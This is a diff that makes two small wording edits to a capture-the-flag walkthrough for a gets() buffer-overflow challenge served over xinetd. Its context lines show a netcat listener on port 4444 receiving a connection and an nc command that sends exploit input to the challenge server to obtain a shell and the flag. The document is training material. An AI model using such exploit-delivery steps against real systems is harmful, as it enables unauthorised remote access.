@@ -1,6 +1,6 @@
 # Walkthrough for the echo challenge
 
-This is a basic buffer overflow using `gets()` and served remotely over xinetd. If you want to run the service on your own linux (I'm using kali), follow these steps (it's assumed that you cloned the repo to `/root/cyber-challenge-walkthrough`):
+This is a basic buffer overflow using `gets()` and served remotely over xinetd. If you want to run the service on your own linux box (I'm using kali), follow these steps (it's assumed that you cloned the repo to `/root/cyber-challenge-walkthrough`):
 
 ```
 root@kali:~# apt-get install xinetd
@@ -353,7 +353,7 @@ listening on [any] 4444 ...
 connect to [192.168.94.133] from (UNKNOWN) [192.168.94.133] 43469
 ```
 
-Now update the return address in the exploit code to match that on the challenge server and deliver it to get your shell and flag (/home/echo/flag/):
+Now update the return address in the exploit code to match that on the challenge server and deliver it to get your shell and flag (/home/echo/flag):
 
 ```
 root@kali:~/Desktop# nc ctf-challenge-server 7 < input 
